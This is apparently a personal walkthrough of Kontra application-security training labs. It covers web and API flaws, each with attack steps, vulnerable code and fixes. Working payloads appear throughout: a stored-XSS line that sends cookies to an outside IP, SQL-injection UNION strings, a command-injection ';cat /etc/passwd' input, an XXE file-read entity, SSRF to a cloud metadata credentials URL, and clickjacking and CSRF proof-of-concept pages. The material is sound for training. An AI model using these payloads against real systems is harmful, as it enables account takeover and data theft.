# This is a walkthrough of Kontra Application Secuirty platform.

## Scala 

> https://guest.application.security/exercises/96 or https://guest.application.security/exercises/207

* Forced browsing :- Search in shodan search bar "onemed" -> Open a link with login panel -> View source to find directories -> use "Link Finder" after seeing obufucated javascript code -> go to /user/register annd create account

> https://guest.application.security/exercises/206

* Reflected XSS :- Search bar in Issue section -> XSS ("<script>alert('hacked')</script>") 

> https://guest.application.security/exercises/208

* Stored XSS :- XSS in Issue Support Ticket description ("<script>new Image().src="http://193.112.33.32/?cookie=" + document.cookie;</script>") 

> https://guest.application.security/exercises/209

* LeftOver Debug code :- Search query in google -> inurl:"cloudable.com" AND (staging | test | dev) -> Look for hidden directories in source and surf it 
	- Mitigation --> In order to mitigate against deploying active debugging code in production instances, developers must ensure appropriate permissions and access-control settings are applied for accessing such features. Alternatively, development teams can add conditional variables to remove debugging code when deploying in production and staging environments. Further, development teams must proactively identify and remove developer comments that reference sensitive information including internal URL's, API endpoints or test credentials before deploying the application.

> https://guest.application.security/exercises/210

* Header Injection :- Reset password function -> Email is sent as plain text in POST request -> Modify Host header (www.abcd.com) -> Reset link controls to our domain 
	- The ability to manipulate an application's response by setting the HTTP Host header to arbitrary values is known as a Host Injection or Host Header Poisoning attack.
	- Mitigation :- In order to effectively mitigate against Header Injection attacks, developers must ensure all incoming HTTP headers are properly sanitized to prevent malicious header values from being included in the response or backend business logic. This can be achieved by implementing an allowlist of allowed hostnames and subdomains, which can be used to prevent malicious hostnames from being included in the response.

> https://guest.application.security/exercises/211

* Weak Randomness :- Forget Password token is predictable and incremental

> https://guest.application.security/exercises/212

* PII data in URL :- Data is sent in plain text in URL
	- Personally Identifiable Information (PII) is a legal term used to define any information that can be used by organizations on its own or with other information to identify, contact, or locate a single person, or to identify an individual in context.

> https://guest.application.security/exercises/213

* Session Fixation :- Session Id in URL allows users to send their session links and wait for them to log in and then refresh your sessiom , you will be logged in to victims account.
	- Mitigation --> To effectively mitigate against Session Fixation attacks, web applications must ignore any session ID provided by the user's browser at login and must always generate a new session to which the user will log in if successfully authenticated. Further, all sessions must be refreshed upon each login, logout and password reset event. This ensures that a user's session ID is not reused by another user or attacker who may already have access to a valid session ID.

> https://guest.application.security/exercises/214

* Insecure URL Redirect :- Login and then view source -> (<a class="nav-link" href="/logout?p_done_url=www.mailtrail.com">Logout</a>) -> Link will be like (https://www.mailtrail.com/logout?p_done_url=https://www.google.com) -> Vuln code (val redirectUrl = request.getQueryString("p_done_url").getOrElse("/login"))
	- Mitigation --> To mitigate the risk of malicious actors exploiting URL redirects in the way that Bob did, application developers must always verify the URL that the user will be redirected or forwarded to, especially if the URL parameter can be changed or tampered on the client-side. This is especially important for applications that use dynamic content, such as web pages, that are not hosted by a single domain. However, in our example, we can eliminate the need to perform URL verification by performing a server-side hostname lookup to securely redirected the user to the login webpage.  

> https://guest.application.security/exercises/215

* XML Injection :- Upload gpx file -> Modify te gpx with xml to fetch /etc/passwd
	- Mitigation --> In order to effectively mitigate against XXE injection attacks, developers must configure their applications XML parsers to disable the parsing of XML eXternal Entities (XXE) and Document Type Definitions (DTD) when parsing XML documents. If DTDs cannot be completely disabled, developers must disable the parsing of external general entities and external parameter entities when parsing untrusted XML files.

> https://guest.application.security/exercises/216

* Clickjacking :- Valid creds but Two Factor is on -> So disable via clickjacking -> Send phishing link and when clicked on "Accept" we disable the 2 factor auth and then login
```html
<html>
<body>

<h2>Review our cookie policy</h2>
<p>NOTICE: This website or it's third-party tools use cookies, which are necessary for its functioning and required to achieve the purposes illustrated in the cookie policy. If you want to learn more or withdraw your consent to all or some of the cookies, please refer to the cookie policy. You accept the use of cookies by closing or dismissing this banner by scrolling this page, by clicking a link or button or by continuing to browse otherwise.</p>

<button>Accept</button>
<button>Learn more and customize</button>
<iframe id="iframe" src="https://www.coinpay.com/user/security/2fac" frameborder="1" style="opacity: 0"></iframe>

</body>
</html>
```
	- Mitigation --> To mitigate against Clickjacking attacks, developers must configure their web servers or load balancers to include X-Frame-Options or Content-Security-Policy header. Both X-Frame-Options andContent-Security-Policy response headers define whether or not a browser should be allowed to embed or render a page in an <iframe> element. For example, setting X-Frame-Options: deny will prevent browsers from rendering your web application in an <iframe> element.

> https://guest.application.security/exercises/217

* Directory Traversal :- ../../../../etc/passwd in URL path 
	- Mitigation :- The most effective way to prevent Directory Traversal vulnerabilities is to avoid passing user-supplied input to filesystem APIs altogether. Many application functions that do this can be rewritten to deliver the same behavior more securely. However, if this is not possible, the application should perform strict input validation against parameters that are intended to be used for file system operations. These include path validation and absolute path checking of user-supplied data.  

> https://guest.application.security/exercises/218

* User Enumeration :- Forgot password -> Enter invalid email -> Says doesn't exists -> Enter valid email -> Says link sent 
```php
def resetPassword() = Action.async { request =>
  val email = request.getQueryString("email")

  DBHelper.findUserByEmail(email) map {
    case Some(user) =>
      sendRecoverPasswordEmail(user)
      Ok("Please check your email inbox to continue")
    case None =>
      BadRequest("Could not reset password because there is no registered user with that e-mail address")
  }
}
```
	- Mitigation :- To effectively mitigate against User Enumeration attacks, developers must display a generic response message regardless of whether or not the username, email or account is valid.

```html
def resetPassword() = Action { request =>
  val email = request.getQueryString("email")

  DBHelper.findUserByEmail(email) map {
    case Some(user) =>
      sendRecoverPasswordEmail(user)
  }

  Ok("Please check your email inbox to continue")
}
```

> https://guest.application.security/exercises/219

* Vertical Priv Esc :- Change password request -> Additional parameter account=3 is there -> change it to account=1 -> Access of admin level
```php
def changePassword() = Action.async { implicit request =>
  val userId = request.session.get("userId").get
  val newPassword = request.session.get("newPassword").get
  val oldPassword = request.session.get("oldPassword").get
  val account = request.session.get("account").get 					//here

  fetchUser(userId) map {
    case Some(u: User) =>
      updateUserPassword(account, newPassword, oldPassword)			//here
      Ok
    case None =>
      Unauthorized
  }
}
```
	- Mitigation -->  To effectively mitigate against Privilege Escalation vulnerabilities, developers must implement access control checks to make sure that the user has the required privileges to access a requested resource or functionality. A proper access control policy is important on the whole product level. It should define appropriate access control permissions for all users and groups. These then need to be described clearly to architects, designers, developers and support teams, such that access control is designed, implemented and used consistently across the application.

> https://guest.application.security/exercises/220

* Horizontal Priv Esc :- Delete account -> See parameter ccid -> Change ccid 
```php
def deleteCreditCard() = SecuredAction.async { request =>
  val user = request.identity
  val cardNumber = request.getQueryString("ccid").get

  DatabaseManager.deleteCreditCardFor(user, cardNumber) map { deleted =>			//here
    if (deleted) Ok else NotFound
  }
}
```
	- Mitigation --> To effectively mitigate against Privilege Escalation vulnerabilities, developers must ensure role-based access controls checks are implemented to ensure that the user has the required privileges to access the requested resource. Product owners must further develop and maintain an access control policy that defines the appropriate access control permissions for all users and groups. This ensures that security requirements are described clearly to architects, designers, developers and support teams, such that the application access control functionality is designed and implemented consistently.
```php
def deleteCreditCard() = SecuredAction.async { request =>
  val user = request.identity
  val cardNumber = request.getQueryString("ccid").get

  if (user.cardNumber == cardNumber) {
    DatabaseManager.deleteCreditCardFor(user, cardNumber) map { deleted =>
      if (deleted) Ok else NotFound
    }
  } else {
    Future.successfull(Forbidden)
  }
}
```

> https://guest.application.security/exercises/221

* SQL Injection :- Enter Email -> bob@livemail.com' -> Payloads
	- bob@livemail.com' UNION ALL SELECT concat_ws(0x3a, version(), user(), database())--
	- bob@livemail.com' UNION ALL SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema=database()--
	- bob@livemail.com' UNION ALL SELECT email FROM carvibe_subscribers--

```php
def unsubscribeUser() = Action { request =>
  val email = request.body.get("email")​

  val sqlQuery = "SELECT id FROM user WHERE email = '" + email + "'"			//here
  // SELECT id FROM user WHERE email = 'bob@livemail.com' UNION ALL SELECT concat_ws(0x3a, version(), user(), database())--'

  val userId = executeQuery(sqlQuery)

  if (userId) {
    subscriptionService.unsubscribeUser(userId) map { unsubscribed =>
      if (unsubscribed) {
        Ok(Json.obj("success" -> true, "email" -> email)
      } else {
        Ok(Json.obj("success" -> false, "email" -> email)
      }
    }
  } else {
    NotFound
  }
}
```

  - Mitigation --> In order to effectively mitigate against SQL Injection attacks, developers must use prepared statements (also known as parameterized queries) when building SQL queries based on user input. Prepared statements prevent SQL Injection attacks by defining placeholder variables to safely pass parameters inside a SQL statement, which are automatically escaped at runtime.

```php
def unsubscribeUser() = Action { request =>
  val email = request.body.get("email")​

  val sqlQuery = sql"SELECT id FROM user WHERE email = $email"
  val userId = executeQuery(sqlQuery)

  if (userId) {
    subscriptionService.unsubscribeUser(userId) map { unsubscribed =>
      if (unsubscribed) {
        Ok(Json.obj("success" -> true, "email" -> email)
      } else {
        Ok(Json.obj("success" -> false, "email" -> email)
      }
    }
  } else {
    NotFound
  }
}
```

> https://guest.application.security/exercises/222

* Command execution :- Enter real phone number -> Ok -> Enter phone number 2-666-777-8888;xxx -> 2-666-777-8888;cat /etc/passwd

```php
def handleTwoFactorAuthentication() = Action { request =>
  request.getQueryString("phone") match {
    case Some(phoneNumber) =>
      val out = executeShellScript("curl -o -I -L -s -w %{http_code}" + API_URL + "?number=" + phoneNumber)
      // curl -o -l -L -s -w %{http_code} https://apigree.sms.gateway.com?number=2-666-777-8888;xxx

      Ok(out)
    case None =>
      BadRequest
  }
}
```

  - Mitigation --> To effectively mitigate against Command Injection attacks, developers must avoid passing user-controllable input in functions or system calls that interface with the operating system environment or invoke third-party applications.
  If this is unavoidable, development teams must perform rigorous input validation against all user-supplied data which includes:
    Validating against an allowlist of permitted values.
    Validating the input length.
    Validating that the input contains only alphanumeric values, ignoring all other escape characters or whitespace string.  

```php
def handleTwoFactorAuthentication() = Action { request =>
  request.getQueryString("phone") match {
    case Some(phoneNumber) =>
      if (isPhoneNumberValid(phoneNumber)) {
        val out = executeShellScript("curl -o -I -L -s -w %{http_code}" + API_URL + "?number=" + phoneNumber)
        
        Ok(out)
      } else {
        BadRequest
      }
    case None =>
      BadRequest
  }
}

private val PHONE_REGEX = "^(\\+\\d{1,2}\\s)?\\(?\\d{3}\\)?[\\s.-]\\d{3}[\\s.-]\\d{4}$"

private def isPhoneNumberValid(phoneNumber: String) = phoneNumber.matches(PHONE_REGEX)
```
> https://guest.application.security/exercises/223

* Token Exposure in URL :- Private API Token in URL 
	- Mitigation --> Passing sensitive data such as API tokens within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers. Application URLs may also be posted on public forums, bookmarked or emailed by developers, thereby increasing the risk of invariably disclosing API tokens.

> https://guest.application.security/exercises/224

* DOM XSS :- XSS via innerhtml DOM 
```php
function refreshTab() {
  const category = (new URL(location.href))
    .searchParams.get('filter')
    .replace('+', ' ');

  const activeTabLink = document.querySelector(`.tablink[data-category=${category}]`);

  if (activeTabLink) {
    activeTab.classList.add('active');
  }

  // Search products
  const products = category ? data.filter(product => {
    return product.category === category;
  }) : data;

  // Show current category name
  document.getElementById('currentTabName').innerHTML = category;

  // Show products
  let productsHTML = '';
  products.forEach(product => {
    productsHTML += `
      <div>
        <img src="${product.icon}">
        <p>${product.name}</p>
        <p>${product.description}</p>
      </div>
    `;
  });

  document.getElementById('list').innerHTML = productsHTML;
}


document.addEventListener('DOMContentLoaded', () => {
  const tabLinks = document.getElementsByClassName('tablink');

  tabLinks.forEach(link => {
    link.addEventListener('click', (event) => {
      location.search = `?filter=${event.target.innerText}`;
    });
  });

  refreshTab();
});
```

	- Mitigation --> 
	```text
		To effectively mitigate against Document Object Model (DOM) based cross-site scripting vulnerabilities, developers must sanitize all untrusted data that is dynamically injected into the DOM.



	For example, if client-side JavaScript is used to manipulate the content, structure, or style of a document's DOM element with user-supplied data, such input strings must be sanitized (encoded or escaped) for safe insertion into a document's DOM. 



	Additionally, DOM objects that may be influenced by the user (attacker) should be carefully reviewed and escaped, including (but not limited to):



	document.URL
	document.URLUnencoded
	document.location (and child properties)
	document.referrer
	window.location (and child properties)
	``` 

> https://guest.application.security/exercises/225

* CSRF :- 

  - CSRF POC -> Login -> Change phone number -> No CSRF token 
```html
<html>
<body>

<h1>We’re currently experiencing technical difficulties.</h1>
<h2>This has impacted our website, Contact Center and Live Chat Teams. We are aiming to have this fixed as soon as possible. We sincerely apologies for any inconvenience caused.</h2>
<p>In the meantime head to our Help & Support page. For more information contact our Live Chat team but please be aware team have limited functionality at present.</p>

<button>VISIT HELP & SUPPORT</button>

<iframe style="display:none" name="csrf-frame"></iframe>
<form method="POST" action="https://www.sparkpay.com/customerprofile/phone/update" target="csrf-frame" id="csrf-form">
  <input type="hidden" name="mobile" value="07739364408">
</form>
<script>document.getElementById("csrf-form").submit();</script>

</body>
</html>
```

  - Mitigation --> A number of effective methods exist for both the prevention and mitigation of CSRF attacks. Among the most common mitigation methods is to embed unique random tokens, also known as anti-CSRF tokens for every HTTP request and response cycle which are subsequently checked and verified by the server. Since a potential attacker can never guess the value of these tokens, anti-CSRF tokens provide a strong defence against CSRF attacks. Further, most modern frameworks provide inbuilt CSRF methods for generating, storing and validating such tokens. However, it is important that this functionality is active and configured correctly across the entire application.

```html
<form action="/customerprofile/phone/update" method=”POST”>
  <label for="label-mobile">Mobile Number</label>
  <input id="label-mobile" name="mobile-number">
  <input type="hidden" name="csrf-token" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz">
  <button class="spark-button blue" type="submit">Save</button>
  <button class="spark-button blue">Cancel</button>  
</form>
```

> https://guest.application.security/exercises/226

* Components with known vulnerabilities :- View source -> prettyPhoto 3.1.3 

> https://guest.application.security/exercises/227

* SSRF :- Upload Image -> s3 bucket link -> change to public link works -> put internal link http://internal-ip/latest/meta-data -> get IAM keys (http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-ROLE)
```php
def downloadImagePreview() = Action { request =>
  val url = request.getQueryString("url").get
  val file = scala.io.Source.fromURL(url).mkString

  if (file) {
    Result(
      header = ResponseHeader(200, Map.empty),
      body = HttpEntity.Strict(ByteString(file), Some("application/octet-stream"))
    )
  } else {
    NotFound
  }
}
```

## Python (Django) API 

> https://guest.application.security/exercises/417

* Improper Assets Management :- Forgot Password -> Send verification code -> 4 attempts -> change endpoint /api/v3/validate to /api/v1/validate -> No restriction on attemps -> Brute force -> Valid code supply
```php
class ValidateCodeApiView(APIView):
  @ratelimit(key='ip', rate='5/h')
  def post(self, request, *args, **kwargs):
    code = request.data.get('code')
    is_valid_code = CodeValidationManager.validate(code)
    
    if is_valid_code:
      CodeValidationManager.set_auth_session()

      return Response(status=status.HTTP_200_OK)
    else
      return Response(
        {'message': 'The supplied token is invalid'},
        status=status.HTTP_401_UNAUTHORIZED,
      )

    
class ValidateCodeOldApiView(APIView):
  def post(self, request, *args, **kwargs):
    code = request.data.get('code')
    is_valid_code = CodeValidationManager.validate(code)
    
    if is_valid_code:
      CodeValidationManager.set_auth_session()

      return Response(status=status.HTTP_200_OK)
    else
      return Response(
        {'message': 'The supplied token is invalid'},
        status=status.HTTP_401_UNAUTHORIZED,
      )
```
  - Mitigation --> APIs tend to expose multiple endpoints over traditional web applications, making proper and updated documentation highly important. To address this, proper hosts and deployed API version inventory also play an important role to mitigate issues such as deprecated API versions and exposed endpoint routes available in live systems.

```php
class ValidateCodeApiView(APIView):
  @ratelimit(key='ip', rate='5/h')
  def post(self, request, *args, **kwargs):
    code = request.data.get('code')
    is_valid_code = CodeValidationManager.validate(code)
    
    if is_valid_code:
      CodeValidationManager.set_auth_session()

      return Response(status=status.HTTP_200_OK)
    else
      return Response(
        {'message': 'The supplied token is invalid'},
        status=status.HTTP_401_UNAUTHORIZED,
      )
```

> https://guest.application.security/exercises/418

* Excessive Data Exposure :- Forget Password -> Email in Request and reset link in also there in Response -> So change email to victim and then reset link is in response 
```php
class ForgotPasswordApiView(APIView):
  def post(self, request, *args, **kwargs):
    email = request.data.get('email')
    is_valid_email = EmailValidator.validate(email)

    if is_valid_email:
      reset_password_data = ResetLinkGenerator.generate_reset_link_for(email);
      EmailNotification.send_reset_link_to(email, reset_password_data['reset_link']);

      return Response(reset_password_data, status=status.HTTP_200_OK)
    else
      return Response('The email address is invalid.', status=status.HTTP_400_BAD_REQUEST)
```
  - Mitigation --> In order to effectively mitigate against Excessive Exposure of data in API's, developers must ensure to never rely on the client-side to filter sensitive data. This can be achieved by making sure that each API endpoint only responds with the data which is essential for the endpoint's purpose and does not leak any other data.
```php
class ForgotPasswordApiView(APIView):
  def post(self, request, *args, **kwargs):
    email = request.data.get('email')
    is_valid_email = EmailValidator.validate(email)

    if is_valid_email:
      reset_link = ResetLinkGenerator.generate_reset_link_for(email);
      EmailNotification.send_reset_link_to(email, reset_link);
    
    return Response('Please check your e-mail inbox to continue the password reset process.', status=status.HTTP_200_OK)
```

> https://guest.application.security/exercises/419

* Broken Object Level Authorization :- Login with creds -> Order history -> REsponce contains order list in json and also personal info like Name and Age -> Change uuserId and get other people info
```php
class OrdersApiView(APIView):
  def get(self, request, user_id, *args, **kwargs):
    user = UserManager.get_user_details(user_id);
    orders = OrdersManager.get_orders_by_user_id(user_id);

    return Response(
      {
        'user': user,
        'orders': orders,
      }, 
      status=status.HTTP_200_OK,
    )
```
  - Mitigation --> To effectively mitigate against Broken Object Level Authorization vulnerabilities, developers must ensure role-based access controls checks are implemented to ensure that the user has the required privileges to access the requested resource. 
  Product owners must further develop and maintain an access control policy that defines the appropriate access control permissions for all users and groups. This ensures that security requirements are described clearly to architects, designers, developers, and support teams, such that the application access control functionality is designed and implemented consistently.
```php
class OrdersApiView(APIView):
  def get(self, request, *args, **kwargs):
    user_id = request.user.id

    if not user_id:
      return Response(
        'You are not authorized to perform this action.', 
        status=status.HTTP_403_FORBIDDEN,
      )

    user = UserManager.get_user_details(user_id);
    orders = OrdersManager.get_orders_by_user_id(user_id);

    return Response(
      {
        'user': user,
        'orders': orders,
      }, 
      status=status.HTTP_200_OK,
    )
```

> https://guest.application.security/exercises/420

* Broken User Authentication -> Login with creds ? asks 2 factor code -> Brute force the 4 digit code
```php
class ValidateCodeApiView(APIView):
  def post(self, request, *args, **kwargs):
    code = request.data.get('code')
    is_valid_code = CodeValidationManager.validate(code)

    if is_valid_code:
      CodeValidationManager.set_auth_session()

    return Response({'valid': is_valid_code}, status=status.HTTP_200_OK)
```

  - Mitigation
  ```text
    There are many methods to stop or prevent brute-force attacks depending on the feature and business use case within the application.



  For example, in Coinpay's scenario, a long term fix to prevent token-based brute force attacks would be to:



  Increase the token length from 4 characters to a minimum of 8, thereby increasing the time it takes to attempt every possible token combination. 
  Add progressive delays or rate-limit the attempts to submit a new token.
  Add CAPTCHA to log in, registration, and two-factor authentication forms.
  ```

```php
class ValidateCodeApiView(APIView):
  @ratelimit(key='ip', rate='3/h')
  def post(self, request, *args, **kwargs):
    code = request.data.get('code')
    is_valid_code = CodeValidationManager.validate(code)

    if is_valid_code:
      CodeValidationManager.set_auth_session()

    return Response({'valid': isValidCode}, status=status.HTTP_200_OK)
```

> https://guest.application.security/exercises/421

* Lack of Resource & Rate Limiting :- Sign up page -> Phone number already registered -> Brute force for different phone numbers 
```php
class SignUp(APIView):
  def post(self, request, *args, **kwargs):
    try:
      UserManager.create_new_user(request.data)

      return Response(status=status.HTTP_200_OK)
    except Exception as e:
      return Response(
        {
          'error': True,
          'field': RequestValidationObject.get_error_field(e),
          'message': RequestValidationObject.get_error_message(e),
        },
        status=status.HTTP_400_BAD_REQUEST,
      )
```

  - Mitigation --> To effectively mitigate against this kind of attack, developers should implement a limit on how often a client can call the API within a defined timeframe. Additionally, a generic response message should be displayed as a response instead of an field-specific one, regardless of whether or not the username, email or account is valid.
```php
class SignUp(APIView):
  @ratelimit(key='ip', rate='2/h')
  def post(self, request, *args, **kwargs):
    try:
      UserManager.create_new_user(request.data)

      return Response(status=status.HTTP_200_OK)
    except Exception as e:
      return Response(
        {
          'error': True,
          'message': 'An error occurred during the sign-up process',
        },
        status=status.HTTP_400_BAD_REQUEST,
      )
```

> https://guest.application.security/exercises/422

* Broken Function Level Authorization :- Login -> Make update request via API -> Change userId on update (GET request) -> Unauthorized -> Try DELETE on other users -> Sucess   
```php
class UsersApiView(APIView):
  def get(self, request, user_id, *args, **kwargs):
    is_valid_user_id = request.user.id == user_id

    if is_valid_user_id:
      user = UserManager.get_user_data(user_id)

      return Response(user, status=status.HTTP_200_OK)
    else
      return Response(None, status=status.HTTP_400_BAD_REQUEST)

  def delete(self, request, user_id *args, **kwargs):
    user_email = UserManager.get_user_email(user_id);
    UserManager.delete_user(userId);

    return Response(
      {'message': f'User {user_email} has been successfully deleted.'}, 
      status=status.HTTP_200_OK,
    )
```

  - Mitigation :- Check for admin level privilages while performing DELETE requests 
```php
class UsersApiView(APIView):
  def get(self, request, user_id, *args, **kwargs):
    is_valid_user_id = request.user.id == user_id

    if is_valid_user_id:
      user = UserManager.get_user_data(user_id)

      return Response(user, status=status.HTTP_200_OK)
    else
      return Response(None, status=status.HTTP_400_BAD_REQUEST)

  def delete(self, request, user_id *args, **kwargs):
    if request.user.role != 'admin':
      return Response(
      {'message': 'You are not allowed to perform this action.'}, 
      status=status.HTTP_403_FORBIDDEN,
    )

    user_email = UserManager.get_user_email(user_id);
    UserManager.delete_user(userId);

    return Response(
      {'message': f'User {user_email} has been successfully deleted.'}, 
      status=status.HTTP_200_OK,
    )
```

> https://guest.application.security/exercises/423
* Mass Assignment :- Reset password -> Intercept reset link -> "isAdmin:False" -> Change "isAdmin:True" -> Now we have admin privileges
```php
class ResetPasswordApiView(APIView):
  def post(self, request, *args, **kwargs):
    token = request.headers['Authorization']
    is_valid_token = UserManager.validate_reset_token(token)

    if is_valid_token:
      user = request.data.get('user')
      UserManager.update(user);

      return Response(status=status.HTTP_200_OK)
    else
      return Response(status=status.HTTP_403_FORBIDDEN)
```

  - Mitigation :- In order to effectively mitigate against Mass Assignment attacks, developers must ensure that all the parameters and payloads the method is expecting are explicitly defined instead of relying on the generic entity objects passed as parameters. Additionally, all schemas and types that are expected in the requests should be explicitly defined at design time and enforced at runtime
```php
class ResetPasswordApiView(APIView):
  def post(self, request, *args, **kwargs):
    token = request.headers['Authorization']
    is_valid_token = UserManager.validate_reset_token(token)

    if is_valid_token:
      password = request.data.get('password')
      UserManager.update_password(password);

      return Response(status=status.HTTP_200_OK)
    else
      return Response(status=status.HTTP_403_FORBIDDEN)
``` 

> https://guest.application.security/exercises/424
* Security Misconfiguration 1 :- Login -> Asks 2FA code -> Create iframe -> Disable 2FA -> Login again -> 2FA bypassed.
** POC

```html
<html>
<body>

<h2>Review our cookie policy</h2>
<p>NOTICE: This website or it's third-party tools use cookies, which are necessary for its functioning and required to achieve the purposes illustrated in the cookie policy. If you want to learn more or withdraw your consent to all or some of the cookies, please refer to the cookie policy. You accept the use of cookies by closing or dismissing this banner by scrolling this page, by clicking a link or button or by continuing to browse otherwise.</p>

<button>Accept</button>
<button>Learn more and customize</button>
<iframe id="iframe" src="https://www.coinpay.com/user/security/2fa" frameborder="1" style="opacity: 0"></iframe>

</body>
</html>
```

  - Mitigation -> To mitigate against Clickjacking attacks, developers must configure their web servers or load balancers to include X-Frame-Options or Content-Security-Policy header. Both X-Frame-Options andContent-Security-Policy response headers define whether or not a browser should be allowed to embed or render a page in an <iframe> element. For example, setting X-Frame-Options: deny will prevent browsers from rendering your web application in an <iframe> element
```bash
# Enable on Nginx
add_header X-Frame-Options "sameorigin" always;
# Enable on Apache
header always set X-Frame-Options "sameorigin"
# Content Security Policy
Content-Security-Policy: frame-src https://www.coinpay.com/
```

> https://guest.application.security/exercises/425
* SQL Injection :- Login with username and password -> On analysis a third parameter ipAddress is present -> At backend the ipAddress is checked in whitelist -> "'" in ipAddress causes error -> Run sqlmap and dump database.
```php
class LoginView(APIView):
  def post(self, request, *args, **kwargs):
    username = request.data.get('username')
    password = request.data.get('password')
    ip_address = request.data.get('ipAddress')

    user_id = AuthManager.validate_credentials(username, password)

    if !user_id:
      return Response(status=status.HTTP_401_UNAUTHORIZED)

    cursor = connection.cursor()

    sql = f"SELECT * FROM ip_allowlist WHERE ipAddress = '${ip_address}'"
    # SELECT * FROM ip_allowlist WHERE ipAddress = '192.13.23.77''

    cursor.execute(sql)
    row = cursor.fetchone()

    if row:
      SessionManager.set_auth_session()

      return Response(
        {
          'id': user_id,
          'authenticated': True,
        },
        status=status.HTTP_200_OK,
      )
    else
      return Response(status=status.HTTP_401_UNAUTHORIZED)
```

  - Mitigation :- In order to effectively mitigate against SQL Injection attacks, developers must use prepared statements (also known as parameterized queries) when building SQL queries based on user input. Prepared statements prevent SQL Injection attacks by defining placeholder variables to safely pass parameters inside a SQL statement, which are automatically escaped at runtime. 
```php
class LoginView(APIView):
  def post(self, request, *args, **kwargs):
    username = request.data.get('username')
    password = request.data.get('password')
    ip_address = request.data.get('ipAddress')

    user_id = AuthManager.validate_credentials(username, password)

    if !user_id:
      return Response(status=status.HTTP_403_FORBIDDEN)

    cursor = connection.cursor()
    sql = f"SELECT * FROM ip_allowlist WHERE ipAddress = %s"

    values = [ip_address]
    cursor.execute(sql, values)
    row = cursor.fetchone()

    if row:
      SessionManager.set_auth_session()

      return Response(
        {
          'id': user_id,
          'authenticated': True,
        },
        status=status.HTTP_200_OK,
      )
    else
      return Response(status=status.HTTP_401_UNAUTHORIZED)
```

> https://guest.application.security/exercises/426
* Insufficient Logging and Monitoring :- Login -> Private Token present -> used curl command along with private token -> But nothing is logged at server 
```php
class ProjectsApiView(APIView):
  def get(self, request, *args, **kwargs):
    token = request.headers['Private-Token']
    is_valid_token = TokenValidator.validate(token)

    if is_valid_token:
      projects = ProjectService.get_projects()

      return Response(projects, status=status.HTTP_200_OK)
    else
      return Response('Invalid token', status=status.HTTP_403_FORBIDDEN)
```

  - Mitigation :- 
  ```text
  In order to effectively mitigate against Insufficient Logging & Monitoring issues, developers must follow the following logging best practices: 
  Ensure all login, access control failures, and server-side input validation failures can be logged with sufficient user context to identify suspicious or malicious accounts, and held for sufficient time to allow delayed forensic analysis.
  Ensure that logs are generated in a format that can be easily consumed by centralized log management solutions.
  Ensure sensitive actions have an audit trail with integrity controls to prevent tampering or deletion, such as append-only database tables or similar.
  Establish effective monitoring and alerting such that suspicious activities are detected and responded to in a timely fashion.
  ```

```php
def logger_middleware(get_response):
  def middleware(request):
    timestamp = time.time()
    method = request.method
    uri = request.build_absolute_uri()
    ip = request.headers['X-FORWARDED-FOR']

    Logger.debug(f'{timestamp}: {method} {uri} {ip}');

    response = get_response(request)
    return response

  return middleware

class ProjectsApiView(APIView):
  def get(self, request, *args, **kwargs):
    token = request.headers['Private-Token']
    is_valid_token = TokenValidator.validate(token)

    if is_valid_token:
      projects = ProjectService.get_projects()

      return Response(projects, status=status.HTTP_200_OK)
    else
      return Response('Invalid token', status=status.HTTP_403_FORBIDDEN)
```

> https://guest.application.security/exercises/427
* XXE Injection :- 
```xml
<!DOCTYPE loadthis [<!ELEMENT loadthis ANY >
<!ENTITY somefile SYSTEM "file:///etc/passwd" >]>
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="CDA.xsl"?>
<!--
 Title:        Continuity of Care Document (CCD)
 
 ********************************************************
 Disclaimer: This sample file contains representative data elements to represent a Continuity of Care Document (CCD). 
 This sample is designed to be used in conjunction with the C-CDA Clinical Notes Implementation Guide.
 ********************************************************
 -->
<loadthis>&somefile;</loadthis>


<ClinicalDocument xmlns="urn:hl7-org:v3" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="C:\XML\CDA_SDTC_Schema\infrastructure\cda\CDA_SDTC.xsd"
```

** Vuln Code
```php
class ClinicalNotesApiView(APIView):
  def post(self, request, *args, **kwargs):
    xml_file = request.FILES['file']

    if not xml_file:
      return Response(status=status.HTTP_400_BAD_REQUEST)

    parser = xml.sax.make_parser()
    parser.setFeature("http://apache.org/xml/features/disallow-doctype-decl", False)
    parser.setFeature("http://xml.org/sax/features/external-general-entities", True)
    parser.setFeature("http://xml.org/sax/features/external-parameter-entities", True)

    doc = parser.parse(xml_file)
    CDAUploader::upload(doc);

    return Response(doc, status=status.HTTP_200_OK)
```

  - Mitigation :- In order to effectively mitigate against XXE injection attacks, developers must configure their application's XML parsers to disable the parsing of XML eXternal Entities (XXE) and Document Type Definitions (DTD) when parsing XML documents. If DTDs cannot be completely disabled, developers must disable the parsing of external general entities and external parameter entities when parsing untrusted XML files. 
```php
class ClinicalNotesApiView(APIView):
  def post(self, request, *args, **kwargs):
    xml_file = request.FILES['file']

    if not xml_file:
      return Response(status=status.HTTP_400_BAD_REQUEST)

    parser = xml.sax.make_parser()
    parser.setFeature("http://apache.org/xml/features/disallow-doctype-decl", True)
    parser.setFeature("http://xml.org/sax/features/external-general-entities", False)
    parser.setFeature("http://xml.org/sax/features/external-parameter-entities", False)

    doc = parser.parse(xml_file)
    CDAUploader::upload(doc);

    return Response(doc, status=status.HTTP_200_OK)
```

> https://guest.application.security/exercises/428
* Security Misconfiguration - Part 2 :- 
```php
def x_frame_middleware(get_response):
  COIN_PAY_REGEX = r'^https:\/\/[a-z]+.coinpay.com$'
  COIN_EXCHANGE_REGEX = r'^https:\/\/[a-z]+.coinexchange.com$'

  def middleware(request):
    origin = request.headers['Origin']
    response = get_response(request)

    if re.search(COIN_PAY_REGEX, origin) or re.search(COIN_EXCHANGE_REGEX, origin):
      response['X-FRAME-OPTIONS', f'ALLOW-FROM {origin}']
    else
      response['X-FRAME-OPTIONS', 'DENY']
    
    return response

  return middleware
```

  - Mitigation :- To prevent this kind of security breach, developers should be extremely careful when using regular expressions for security configuration purposes, as it is quite easy to overlook a mistake in such an expression.
```bash
# Enable on Nginx
add_header Content-Security-Policy "frame-ancestors 'self' https://*.coinpay.com https://*.coinexchange.com";

# Enable on Apache
header always set Content-Security-Policy "frame-ancestors 'self' https://*.coinpay.com https://*.coinexchange.com";
```

## React 
> https://guest.application.security/exercises/297
